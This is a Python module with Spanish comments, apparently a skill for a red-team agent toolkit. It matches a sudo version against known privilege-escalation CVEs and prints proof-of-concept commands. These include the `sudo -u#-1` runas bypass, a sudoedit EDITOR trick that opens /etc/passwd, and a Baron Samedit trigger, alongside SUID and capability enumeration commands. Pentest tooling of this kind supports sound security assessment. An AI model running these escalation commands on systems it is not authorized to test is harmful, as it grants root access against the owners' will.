"""
Skill: sudo_privesc
Analiza la versión de sudo y detecta CVEs de escalada de privilegios conocidos.
Enfoque "discover, don't assume": si no se da la versión, devuelve los comandos
de enumeración para que el operador los ejecute y pegue la salida.

Base de CVEs mantenida al estilo RedTeam Barranquilla (https://redteambq.co/).
"""
import re

META = {
    "name": "sudo_privesc",
    "category": "ataque",
    "description": (
        "Detecta escalada de privilegios por sudo: compara la versión contra CVEs "
        "conocidos (Baron Samedit, runas -1, sudoedit, chwoot/chroot) y da el PoC. "
        "Sin versión, devuelve los comandos de enumeración a ejecutar."
    ),
    "args": ["version"],
    "example": "SKILL:sudo_privesc version=1.9.15",
}

# (nombre, rango afectado como (min_incl, max_incl) de tuplas, CVE, severidad, nota/PoC)
_SUDO_CVES = [
    ("Baron Samedit (heap overflow)", (1, 8, 2), (1, 9, 5), "CVE-2021-3156", "critical",
     "sudoedit -s '\\' $(python3 -c 'print(\"A\"*1000)')  → compila exploit público (worawit/CVE-2021-3156)."),
    ("sudoedit arbitrary file (bypass)", (1, 8, 0), (1, 9, 12), "CVE-2023-22809", "high",
     "Con EDITOR controlado: EDITOR='vi -- /etc/passwd' sudoedit <archivo permitido>."),
    ("runas -1 bypass", (1, 8, 0), (1, 8, 27), "CVE-2019-14287", "high",
     "sudo -u#-1 <cmd>  → ejecuta como root si sudoers usa ALL,!root."),
    ("sudo chroot/chwoot (getwd)", (1, 9, 14), (1, 9, 17), "CVE-2025-32463", "critical",
     "Explota la opción --chroot (sudo -R) con /etc/nsswitch.conf malicioso → root. PoC público."),
    ("sudo host option bypass", (1, 9, 0), (1, 9, 17), "CVE-2025-32462", "medium",
     "sudo -h <host> puede saltar restricciones Host/Host_Alias en sudoers."),
]


def _parse_ver(text: str):
    m = re.search(r"(\d+)\.(\d+)\.(\d+)", text or "")
    if not m:
        return None
    return tuple(int(x) for x in m.groups())


def _in_range(v, lo, hi):
    return lo <= v <= hi


def _enum_guide() -> dict:
    out = (
        "No se indicó versión de sudo. Ejecuta y pega la salida (discover, don't assume):\n\n"
        "  sudo --version | head -1\n"
        "  sudo -l                      # qué puedo ejecutar y como quién\n"
        "  find / -perm -4000 -type f 2>/dev/null   # binarios SUID\n"
        "  getcap -r / 2>/dev/null                  # capabilities\n"
        "\nLuego:  SKILL:sudo_privesc version=<la versión>\n"
    )
    return {"success": True, "output": out, "findings": [
        {"type": "privesc_enum", "value": "sudo", "severity": "info",
         "description": "Comandos de enumeración de privesc por sudo.",
         "source": "sudo_privesc"}]}


def run(**kwargs) -> dict:
    raw = (kwargs.get("version") or "").strip()
    if not raw:
        return _enum_guide()
    v = _parse_ver(raw)
    if not v:
        return {"success": False,
                "output": f"No pude extraer una versión de: {raw!r}. Ej: version=1.9.15",
                "findings": []}

    matches, lines = [], [f"sudo {v[0]}.{v[1]}.{v[2]} — análisis de CVEs de escalada:\n"]
    findings = []
    for name, lo, hi, cve, sev, poc in _SUDO_CVES:
        if _in_range(v, lo, hi):
            matches.append(name)
            lines.append(f"  🔴 {cve} — {name} [{sev.upper()}]")
            lines.append(f"      PoC: {poc}\n")
            findings.append({
                "type": "sudo_cve", "value": cve, "severity": sev,
                "description": f"{name} afecta a sudo {v[0]}.{v[1]}.{v[2]} ({cve})",
                "source": "sudo_privesc",
            })

    if not matches:
        lines.append("  ✓ Sin CVEs de sudo conocidos para esta versión en la base local.")
        lines.append("    Revisa también: sudo -l, binarios SUID y GTFOBins.")
        findings.append({"type": "sudo_version", "value": f"{v[0]}.{v[1]}.{v[2]}",
                         "severity": "info",
                         "description": "Versión de sudo sin CVE conocido en la base local.",
                         "source": "sudo_privesc"})
    else:
        lines.append("⚠️  Verifica explotabilidad en el entorno antes de ejecutar cualquier PoC.")

    return {"success": True, "output": "\n".join(lines), "findings": findings}
